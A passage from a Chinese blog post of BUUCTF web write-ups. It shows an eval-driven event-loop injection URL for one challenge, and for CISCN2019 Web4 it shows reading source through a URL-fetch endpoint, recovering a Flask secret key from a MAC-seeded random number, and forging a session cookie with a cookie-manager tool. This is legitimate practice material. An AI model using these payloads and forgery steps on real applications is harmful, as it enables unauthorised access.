           <span class="hljs-comment"># resp += str(e) # only for debugging</span><br>                <span class="hljs-keyword">continue</span><br>            <span class="hljs-keyword">if</span> ret_val <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>                <span class="hljs-keyword">if</span> resp <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>                    resp = ret_val<br>                <span class="hljs-keyword">else</span>:<br>                    resp += ret_val<br>    <span class="hljs-keyword">if</span> resp <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">or</span> resp == <span class="hljs-string">&#x27;&#x27;</span>:<br>        resp = (<span class="hljs-string">&#x27;404 NOT FOUND&#x27;</span>, <span class="hljs-number">404</span>)<br>    session.modified = <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">return</span> resp<br></code></pre></td></tr></table></figure>

<p>这里存在一个eval函数 可以帮助执行命令，题目只能买三个钻石，而实际解题需要五个及以上，我们发现</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">buy_handler</span>(<span class="hljs-params">args</span>):</span><br>    num_items = <span class="hljs-built_in">int</span>(args[<span class="hljs-number">0</span>])<br>    <span class="hljs-keyword">if</span> num_items &lt;= <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;invalid number(&#123;&#125;) of diamonds to buy&lt;br /&gt;&#x27;</span>.<span class="hljs-built_in">format</span>(args[<span class="hljs-number">0</span>])<br>    session[<span class="hljs-string">&#x27;num_items&#x27;</span>] += num_items<br>    trigger_event([<span class="hljs-string">&#x27;func:consume_point;&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<br>        num_items), <span class="hljs-string">&#x27;action:view;index&#x27;</span>])<br></code></pre></td></tr></table></figure>

<p>这里可以直接加 num_items 那，上面的execute_event_loop如果可以执行到buy_handler就可以凭空加钻石了</p>
<p>也就是 eval(trigger_event)</p>
<p>然后有</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">?action:trigger_event%<span class="hljs-number">23</span>;action:buy;<span class="hljs-number">2%</span><span class="hljs-number">23</span>action:buy;<span class="hljs-number">3%</span><span class="hljs-number">23</span>action:get_flag;%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>

<p>拿到的session进行base64decode即可</p>
<h2 id="CISCN2019-华东南赛区-Web4"><a href="#CISCN2019-华东南赛区-Web4" class="headerlink" title="[CISCN2019 华东南赛区]Web4"></a>[CISCN2019 华东南赛区]Web4</h2><p><code>http://1770b21a-5676-453c-815a-4899c1f0f10e.node4.buuoj.cn:81/read?url=app.py</code></p>
<p>读取源码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># encoding:utf-8</span><br><span class="hljs-keyword">import</span> re, random, uuid, urllib<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, session, request<br><br>app = Flask(__name__)<br>random.seed(uuid.getnode())<br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = <span class="hljs-built_in">str</span>(random.random()*<span class="hljs-number">233</span>)<br>app.debug = <span class="hljs-literal">True</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span>():</span><br>    session[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-string">&#x27;www-data&#x27;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Hello World! &lt;a href=&quot;/read?url=https://baidu.com&quot;&gt;Read somethings&lt;/a&gt;&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/read&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">read</span>():</span><br>    <span class="hljs-keyword">try</span>:<br>        url = request.args.get(<span class="hljs-string">&#x27;url&#x27;</span>)<br>        m = re.findall(<span class="hljs-string">&#x27;^file.*&#x27;</span>, url, re.IGNORECASE)<br>        n = re.findall(<span class="hljs-string">&#x27;flag&#x27;</span>, url, re.IGNORECASE)<br>        <span class="hljs-keyword">if</span> m <span class="hljs-keyword">or</span> n:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;No Hack&#x27;</span><br>        res = urllib.urlopen(url)<br>        <span class="hljs-keyword">return</span> res.read()<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> ex:<br>        <span class="hljs-built_in">print</span> <span class="hljs-built_in">str</span>(ex)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;no response&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/flag&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">flag</span>():</span><br>    <span class="hljs-keyword">if</span> session <span class="hljs-keyword">and</span> session[<span class="hljs-string">&#x27;username&#x27;</span>] == <span class="hljs-string">&#x27;fuck&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>).read()<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Access denied&#x27;</span><br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(<br>        debug=<span class="hljs-literal">True</span>,<br>        host=<span class="hljs-string">&quot;0.0.0.0&quot;</span><br>    )<br><br><br></code></pre></td></tr></table></figure>

<p>有 Secret 有 username可以考虑 Flask 伪造session</p>
<p>uuid.getnode() 说明种子是 mac地址的十进制表示形式</p>
<p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202022222440.png" srcset="/img/loading.gif" lazyload alt="image-20220202222241378"></p>
<p><code>5a:ab:36:90:92:94</code> 获取地址</p>
<p>求种子</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br>random.seed(<span class="hljs-number">0x0242ae0295f6</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(random.random()*<span class="hljs-number">233</span>))<br><span class="hljs-comment">#82.56599527038603</span><br></code></pre></td></tr></table></figure>

<p>解密session &amp; 伪造session</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@VM-<span class="hljs-number">24</span>-<span class="hljs-number">13</span>-debian:/opt/flask-session-cookie-manager# python<span class="hljs-number">3</span> flask_session_cookie_manager<span class="hljs-number">3</span>.py decode -c &#x27;eyJ<span class="hljs-number">1</span>c<span class="hljs-number">2</span>VybmFtZSI<span class="hljs-number">6</span>eyIgYiI<span class="hljs-number">6</span>ImQzZDNMV<span class="hljs-number">1</span>JoZEdFPSJ<span class="hljs-number">9</span>fQ.YfqSEA.NPXmEcGUHLoZzUaHtVIRL<span class="hljs-number">2</span>zywNk&#x27;<br><span class="hljs-attribute">b</span>&#x27;&#123;<span class="hljs-string">&quot;username&quot;</span>:&#123;<span class="hljs-string">&quot; b&quot;</span>:<span class="hljs-string">&quot;d3d3LWRhdGE=&quot;</span>&#125;&#125;&#x27;<br><br><span class="hljs-attribute">root</span>@VM-<span class="hljs-number">24</span>-<span class="hljs-number">13</span>-debian:/opt/flask-session-cookie-manager# python<span class="hljs-number">3</span> flask_session_cookie_manager<span class="hljs-number">3</span>.py encode -t &#x27;&#123;<span class="hljs-string">&quot;username&quot;</span>:&#123;<span class="hljs-string">&quot; b&quot;</span>:<span class="hljs-string">&quot;cm9vdA==&quot;</span>&#125;&#125;&#x27;  -s &#x27;<span class="hljs-number">82</span>.<span class="hljs-number">56599527038603</span>&#x27;<br><span class="hljs-attribute">eyJ1c2VybmFtZSI6eyIgZGkiOnsiIGJfXyI6ImNtOXZkQT09In19fQ</span>.YfqVWg.cNyImoM<span class="hljs-number">85</span>WxXWDX<span class="hljs-number">3</span>z<span class="hljs-number">3</span>KG<span class="hljs-number">33</span>wK<span class="hljs-number">2</span>qk<br></code></pre></td></tr></table></figure>

<p>然后替换session就行</p>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/CTF/">CTF</a>
                    
                  </div>
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/Web/">Web</a>
                    
                  </div>
                
              </div>
              <p class="note note-warning">
                <strong>本文作者: </strong><a href="/">D3n13d</a> <br>
                <strong>本文链接: </strong><a href="https://d3n13d.github.io/2022/02/09/BUUCTF-web-%E7%AC%AC%E5%9B%9B%E9%A1%B5wp%E5%88%86%E4%BA%AB/">https://d3n13d.github.io/2022/02/09/BUUCTF-web-%E7%AC%AC%E5%9B%9B%E9%A1%B5wp%E5%88%86%E4%BA%AB/</a> <br>
                <strong>版权声明: </strong>本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
                   </p>
                   
              <!-- 
                <p class="note note-warning">
                  
                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
                  
                </p>
               -->
              
                <div class="post-prevnext">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2022/02/11/Leetcode-20%E5%A4%A9%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E8%AE%A1%E5%88%92%E4%B9%8B%E7%AE%97%E6%B3%95%E5%85%A5%E9%97%A8/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">Leetcode 20天算法刷题计划之算法入门</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2022/01/30/Vulnhub-bottleneck/">
                        <span class="hidden-mobile">Vulnhub-bottleneck</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
              <!-- Comments -->
              <article class="comments" id="comments" lazyload>
                
                  
                
                
  <script type="text/javascript">
    Fluid.utils.loadComments('#comments', function() {
      var light = 'preferred-color-scheme';
      var dark = 'github-dark';
      var schema = document.documentElement.getAttribute('data-user-color-scheme');
      if (schema === 'dark') {
        schema = dark;
      } else {
        schema = light;
      }
      window.UtterancesThemeLight = light;
      window.UtterancesThemeDark = dark;
      var s = document.createElement('script');
      s.setAttribute('src', 'https://utteranc.es/client.js');
      s.setAttribute('repo', 'D3n13d/utterances');
      s.setAttribute('issue-term', 'title');
      
      s.setAttribute('theme', schema);
      s.setAttribute('crossorigin', 'anonymous');
      document.getElementById('comments').appendChild(s);
    })
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


              </article>
            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202110012686.png" srcset="/img/loading.gif" lazyload class="rounded mx-auto d-block mt-5" style="width:120px; height:120px;">
  <br>
  <center> # 曾记否，到中流击水，浪遏飞舟？ </center>
<footer class="text-center mt-5 py-3">

  
  <div class="footer-content">
    <div>
      <span id="timeDate">载入天数...</span>
      <span id="times">载入时分秒...</span>
      <script>
      var now = new Date();
      function createtime(){
          var grt= new Date("01/07/2022 00:00:00");//此处修改你的建站时间或者网站上线时间
          now.setTime(now.getTime()+250);
          days = (now - grt ) / 1000 / 60 / 60 / 24;
          dnum = Math.floor(days);
          hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum);
          hnum = Math.floor(hours);
          if(String(hnum).length ==1 ){
              hnum = "0" + hnum;
          }
          minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
          mnum = Math.floor(minutes);
          if(String(mnum).length ==1 ){
                    mnum = "0" + mnum;
          }
          seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
          snum = Math.round(seconds);
          if(String(snum).length ==1 ){
                    snum = "0" + snum;
          }
          
          document.getElementById("timeDate").innerHTML = "🚀 &nbsp;"+dnum+"&nbsp天";  //此次自定义显示内容
          document.getElementById("times").innerHTML = hnum + "&nbsp小时&nbsp" + mnum + "&nbsp分&nbsp" + snum + "&nbsp秒";
      }  //此次自定义显示内容
      setInterval("createtime()",250);
      </script>
    </div>
  </div>

  
  
    <!-- 不蒜子统计 -->
    
      <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            <span >本站总访问量：
            <span id="busuanzi_value_site_pv"></span>次</span>
    
    
    
    
    
    
  <div>©2022<a href="https://d3n13d.github.io/">&nbsp;&nbsp;D3n13d 的快乐小屋</a></div>

  
</footer>




  <!-- SCRIPTS -->
  
  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":true,"trickleSpeed":80})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  <script  src="/js/local-search.js" ></script>



  
    <script  src="/js/img-lazyload.js" ></script>
  



  



  
    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
  
  
    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
  
  
    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
  
  
    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
  



  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>




  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
        typing(title);
      
    })(window, document);
  </script>














  
<script src="//cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script>
<script src="//cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script>



<!-- 主题的启动项 保持在最底部 -->
<script  src="/js/boot.js" ></script>


<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>
